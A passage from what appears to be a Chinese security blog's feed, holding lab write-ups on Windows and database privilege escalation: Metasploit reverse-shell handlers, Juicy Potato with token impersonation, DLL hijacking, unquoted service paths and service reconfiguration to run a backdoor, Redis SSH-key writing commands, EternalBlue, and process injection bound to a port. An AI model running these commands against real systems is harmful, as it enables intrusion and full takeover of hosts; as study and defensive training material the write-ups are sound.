src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622220937943.png" alt="image-20220622220937943"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>配置msf监听会话：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622221321314.png" alt="image-20220622221321314"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>找到后门文件：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622215140698.png" alt="image-20220622215140698"></p><p>利用webshell执行后门文件：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622221359402.png" alt="image-20220622221359402"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>msf监听到ip:</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622221439091.png" alt="image-20220622221439091"></p><p>查看权限：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622221508421.png" alt="image-20220622221508421"></p><p>低权限。</p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>上传烂土豆：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622221653119.png" alt="image-20220622221653119"></p><p>运行：（要在msf上运行烂土豆）</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622222440045.png" alt="image-20220622222440045"></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622222422323.png" alt="image-20220622222422323"></p><p>（这里不能单纯使用令牌窃取，令牌窃取需要足够的权限，管理员权限）</p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>查看权限，还是iusr：</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622222514092.png" alt="image-20220622222514092"></p><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>使用令牌窃取：</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622223552766.png" alt="image-20220622223552766"></p><p>（警告信息我们得知无法正常假冒用户，所以令牌假冒失败。）</p><p>正常假冒用户列表如下：</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622223457390.png" alt="image-20220622223457390"></p><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>得到系统权限：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622224757882.png" alt="image-20220622224757882"></p><p>（具体的流程就是以上这样，使用烂土豆配合令牌窃取提权）</p><p>windows内核EXP：</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h2 id="0x01-DLL劫持配合令牌窃取提权"><a href="#0x01-DLL劫持配合令牌窃取提权" class="headerlink" title="0x01 DLL劫持配合令牌窃取提权"></a>0x01 DLL劫持配合令牌窃取提权</h2><h3 id="0x00-原理-1"><a href="#0x00-原理-1" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>DLL劫持指的是，病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。</p><p>如下图，LPK.dll是应用程序运行所需加载的DLL，该系统文件默认在C:\Windows\system32路径下，但由于windows优先搜索当前路径，所以当我们把恶意LPK.dll放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作。</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220621234543245.png" alt="image-20220621234543245"></p><p>###0x01 DLL劫持前提条件</p><p>1、有权限替换dll文件</p><p>2、有第三方软件</p><p>3、管理员必须运行此第三方软件</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>流程：信息收集（服务器上的第三方程序的信息）-进程调试（分析这个程序在运行的时候调用了那些dll）-制作 dll 并上传(制作后门dll去替换原有的dll)-替换 dll-启动应用后成功</p><p>下载带有dll文件的第三方软件：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622225735540.png" alt="image-20220622225735540"></p><p>下载火绒剑：</p><p>：<a href="https://www.jb51.net/softs/490503.html">https://www.jb51.net/softs/490503.html</a> </p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622230115819.png" alt="image-20220622230115819"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>运行程序，使用火绒剑分析调用了那些dll文件：</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622231657443.png" alt="image-20220622231657443"></p><p>这里只有一个数字签名文件，还是在c盘下；所有的dll文件都是在c盘windows下运行，导致没有权限替换dll文件。</p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>思路：已经拿到了webshell权限，利用webshell权限上传能够替换的dll文件（这里的dll文件利用msf生成），之后利用msf监听IP端口，接着重新启动第三方软件，就会调用被替换的dll后门文件，msf监听到ip，再配合令牌窃取拿到系统权限。这就是利用dll劫持提权。</p><p>（上图中所有的dll文件都在c盘windows目录下，webshell权限太低，无法上传到对应替换dll文件的目录下，就无法替换dll文件，一般要找运行第三方软件的目录或者有权限上传的目录，之后再进行dll文件替换）</p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p>应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><h2 id="0x02-不带引号服务路径配合MSF本地提权"><a href="#0x02-不带引号服务路径配合MSF本地提权" class="headerlink" title="0x02 不带引号服务路径配合MSF本地提权"></a>0x02 不带引号服务路径配合MSF本地提权</h2><h3 id="0x00-原理-2"><a href="#0x00-原理-2" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>不加引号：C:\Program Files\phpstudy_pro\COM\phpStudyServer.exe</strong></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622233243166.png" alt="image-20220622233243166"></p><p><strong>由于没加引号，这里的C:\Program Files里的空格相当于截断了路径，如果在C盘有一个C:\Program.exe系统就会优先运行它。</strong></p><p><strong>加引号：”C:\Program Files\phpstudy_pro\COM\phpStudyServer.exe”</strong></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622233358779.png" alt="image-20220622233358779"></p><p>可以看到两种情况返回的结果不一样。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>过程:检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功</p><p>查看有哪些不带引号的服务：</p><blockquote><p>命令：wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ | findstr &#x2F;i &#x2F;v “””</p></blockquote><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622234212661.png" alt="image-20220622234212661"></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622234236519.png" alt="image-20220622234236519"></p><p>列出很多不带引号的服务，筛选了所有的服务，没有一个文件名带有空格；因此无法利用。</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>类似下图的带空格的目录才可利用：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622234725729.png" alt="image-20220622234725729"></p><h3 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h3><p>利用msf生成特殊目录的exe文件：Program.exe</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622234843823.png" alt="image-20220622234843823"></p><p>之后利用webshell上传到c盘。</p><h3 id="0x05-2"><a href="#0x05-2" class="headerlink" title="0x05"></a>0x05</h3><p>启动服务就会调用这个Program.exe这个木马文件，利用msf监听ip获取权限：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622235152324.png" alt="image-20220622235152324"></p><h2 id="0x03-不安全的服务权限配置提权-本地权限"><a href="#0x03-不安全的服务权限配置提权-本地权限" class="headerlink" title="0x03 不安全的服务权限配置提权-本地权限"></a>0x03 不安全的服务权限配置提权-本地权限</h2><h3 id="0x00-原理-3"><a href="#0x00-原理-3" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。 过程:检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>创建一个服务：</p><pre class="line-numbers language-none"><code class="language-none">sc create NewServiceName binpath&#x3D;&quot;C:\Program.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里为了方便自己建一个服务，实际情况下可以用真实的服务然后改指向文件。</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622235508689.png" alt="image-20220622235508689"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>使用微软自带的工具accesschk查看有哪些不安全的服务：</p><p>工具下载链接：<a href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622235558301.png" alt="image-20220622235558301"></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622235609371.png" alt="image-20220622235609371"></p><h3 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h3><p>配置这个服务将它的路径指向我们的后门，开启服务MSF获得会话提权</p><pre class="line-numbers language-none"><code class="language-none">sc config &quot;NewServiceName&quot; binpath&#x3D;&quot;C:Programexe&quot;&#x2F;&#x2F;配置服务指向后门sc start &quot;NewServiceName&quot;&#x2F;&#x2F;开启服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/image-20220622235653078.png" alt="image-20220622235653078"></p><h2 id="0x04-windows提权文章"><a href="#0x04-windows提权文章" class="headerlink" title="0x04 windows提权文章"></a>0x04 windows提权文章</h2><p>windows提权参考文章：<br><a href="https://xz.aliyun.com/t/2519">https://xz.aliyun.com/t/2519</a></p><p>大佬写的详细，值得细细揣摩。</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-数据库提权2</title>
      <link href="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/"/>
      <url>/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83.png" alt="数据库提权"></p><h2 id="0x01-Redis数据库提权"><a href="#0x01-Redis数据库提权" class="headerlink" title="0x01 Redis数据库提权"></a>0x01 Redis数据库提权</h2><h3 id="0x00-redis介绍"><a href="#0x00-redis介绍" class="headerlink" title="0x00 redis介绍"></a>0x00 redis介绍</h3><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。</p><p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。</p><p>如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p><p>Redis默认绑定在0.0.0.0:6379，攻击者直接可以访问到，默认无密码，登录账户为root。</p><h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>满足三点<br>能访问到、能登录、能写入（有root）</p><ul><li>开放在公网，没有和ip绑定，默认无密码</li><li>root权限</li><li>webshell和公私钥匙通信原理</li><li>有可能把redis的默认端口6379修改</li></ul><h3 id="0x02-Redis常用命令"><a href="#0x02-Redis常用命令" class="headerlink" title="0x02 Redis常用命令"></a>0x02 Redis常用命令</h3><p>1、写入命令，创建备份文件：<br>config set dir &#x2F;home&#x2F;test #创建写入目录<br>config set dbfilename 1.txt #创建写入文件<br>config get dir # 查看目录是否创建成<br>config get dbfilename # 查看文件是否创建成功<br>save</p><p>2、连接数据库命令：<br>redis-cli -h ip<br>ssh-keygen -t rsa #生成公私钥，密码设置为空：<br>ssh -I rsa root@ip #免密登录</p><p>3、将公钥写入txt文件（为什么要把公钥写入txt文件里）：<br>(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; 1.txt</p><p>4、将存放公钥的txt文件写入redis服务器：</p><p>cat 1.txt ｜ redis-cli -h ip -x set crack</p><p>5、linux存放公私的地址：&#x2F;root&#x2F;.ssh<br>6、公钥的备份名字：authorized keys</p><p>参考文章：<br><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><h3 id="0x03-Redis常见漏洞"><a href="#0x03-Redis常见漏洞" class="headerlink" title="0x03 Redis常见漏洞"></a>0x03 Redis常见漏洞</h3><p>（1）利用计划任务执行命令反弹 shell</p><p>（2）.写 ssh-keygen 公钥然后使用私钥登陆</p><p>（3）.权限较低往 web 物理路径写 webshell</p><p>最常利用的是第一种，其他两种需要以下条件才可利用：</p><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ul><p>参考文章：</p><p><a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a></p><h3 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h3><p>（注意：以下操作，均需重启 Redis 后才能生效。）</p><p>1、绑定需要访问数据库的 IP。 将 127.0.0.1 修改为需要访问此数据库的 IP 地址。</p><p>2、设置访问密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。</p><p>3、修改 Redis 服务运行账号。以较低权限账号运行 Redis 服务，禁用账号的登录权限。</p><h2 id="0x02-PostgreSQL-数据库权限提升"><a href="#0x02-PostgreSQL-数据库权限提升" class="headerlink" title="0x02 PostgreSQL 数据库权限提升"></a>0x02 PostgreSQL 数据库权限提升</h2><h3 id="0x00-提权方式"><a href="#0x00-提权方式" class="headerlink" title="0x00 提权方式"></a>0x00 提权方式</h3><p>1、低权限提权：CVE-2018-1058</p><p>2、高权限命令执行漏洞：CVE-2019-9193</p><p>###0x01 CVE-2018-1058</p><p>原理：</p><p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p><p>版本：9.3-10</p><p>###0x02 CVE-2019-9193</p><p>原理：</p><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。</p><p>版本：9.3-11</p><h3 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h3><p>利用vulhub开启环境进行漏洞复现：</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621092535016.png" alt="image-20220621092535016"></p><h2 id="0x03-令牌窃取提权"><a href="#0x03-令牌窃取提权" class="headerlink" title="0x03 令牌窃取提权"></a>0x03 令牌窃取提权</h2><h3 id="0x00-令牌简介及原理"><a href="#0x00-令牌简介及原理" class="headerlink" title="0x00 令牌简介及原理"></a>0x00 令牌简介及原理</h3><p>● 令牌就是系统的临时密钥，相当于账户名和密码，原来决定是否允许这次请求和判断是属于哪一个用户的，他允许你不提供密码或其他凭证的前提下访问网络和系统资源<br>● 令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来<br>● 令牌有很多种：<br>访问令牌（Access Token）表示访问和控制操作主题的系统对象<br>密保令牌（Security Tocken）是一种计算机身份校验的物理设备<br>会话令牌（Session Tocken）的交互会话中唯一的身份标识符</p><p>原理：进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</p><h3 id="0x01-适用范围"><a href="#0x01-适用范围" class="headerlink" title="0x01 适用范围"></a>0x01 适用范围</h3><p>Microsoft Windows XP Professional SP3 和之前版本</p><p>Windows Server 2003 SP2 和之前的版本</p><p>Windows Server 2003 x64 和 x64 SP2</p><p>Windows Server 2003（用于基于 Itanium 的系统 SP2 和先前版本）</p><p>Windows Server 2008 x32 x64</p><p>Windows Server 2008（用于基于 Itanium 的系统）</p><p>Windows Vista SP1 和之前的版本</p><p>Windows Vista x64 SP1 和之前的版本</p><h3 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h3><p><strong>攻击机kali：192.168.216.135</strong><br><strong>靶机win7：192.168.216.149</strong></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>先扫描目标是否存在ms17-010漏洞</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621112223742.png" alt="image-20220621112223742"></p><p>看到3这个模块可以利用。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>使用use命令使用此模块：</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看模块配置信息：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621112444318.png" alt="image-20220621112444318"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>需要我们配置RHOST主机IP，之后run，运行：</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.216.149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621112838455.png" alt="image-20220621112838455"></p><p>可以看到目标看起来易受攻击，也就表示可能存在相关漏洞。</p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>查找攻击模块：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621113247544.png" alt="image-20220621113247544"></p><p>选择第0个永恒之蓝。</p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>同样，使用use命令加载模块，之后show options：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621113509964.png" alt="image-20220621113509964"></p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>设置目标主机ip之后run运行：</p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.216.149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621114010986.png" alt="image-20220621114010986"></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621114036064.png" alt="image-20220621114036064"></p><p>可以看到已经获取到了权限。（本意不在这里）</p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>继续从设置ip处开始：</p><p>找一个payload：</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; search windows&#x2F;x64&#x2F;shell type:payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621114548125.png" alt="image-20220621114548125"></p><p>挑选第3个反弹shell的payloads：</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621115308944.png" alt="image-20220621115308944"></p><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>设置一下本机payload监听地址：</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set LHOST 192.168.216.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置完成后exploit开始执行：</p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621120549744.png" alt="image-20220621120549744"></p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621120605108.png" alt="image-20220621120605108"></p><p>拿到了权限。（直接是system权限，无语，后面的令牌窃取继续执行）</p><h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>先执行<code>use incognito</code>命令，然后输入<code>list_tokens -u</code>列出可用的token：</p><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621121251702.png" alt="image-20220621121251702"></p><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p>使用<code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code>命令窃取令牌，执行shell命令弹出shell：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621121512359.png" alt="image-20220621121512359"></p><p>获取系统权限。</p><h2 id="0x04-进程注入提权"><a href="#0x04-进程注入提权" class="headerlink" title="0x04 进程注入提权"></a>0x04 进程注入提权</h2><h3 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。</p><p><strong>使用 pinjector.exe 注入到system用户的进程中，使该进程绑定在0.0.0.0:port ，并建立监听端口，攻击者从攻击机上主动连接该地址，获取到系统的system权限。</strong></p><h3 id="0x01-适用范围-1"><a href="#0x01-适用范围-1" class="headerlink" title="0x01 适用范围"></a>0x01 适用范围</h3><p>适用于windows2008 之前的操作系统。</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>上传 pinjector.exe到靶机，执行<code>pinjector.exe -l</code>命令列出所有进程：<br><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621144009412.png" alt="image-20220621144009412"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>选择一个system权限运行的进程，对此pid进程执行注入，并建立侦听端口：</p><pre class="line-numbers language-none"><code class="language-none">执行命令：pinjector.exe -p &lt;pid&gt; cmd &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621144121738.png" alt="image-20220621144121738"></p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>使用 nc 连接目标服务器端口：</p><pre class="line-numbers language-none"><code class="language-none">执行命令：nc -nv 192.168.0.117 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832/image-20220621144218702.png" alt="image-20220621144218702"></p><p>连接成功，系统权限。</p><p>###0x05</p><p>进程注入工具下载地址：</p><p><a href="https://www.tarasco.org/security/Process_Injector/processinjector.zip">https://www.tarasco.org/security/Process_Injector/processinjector.zip</a></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-数据库提权1</title>
      <link href="/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/"/>
      <url>/2022/06/20/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%831/</url>
      
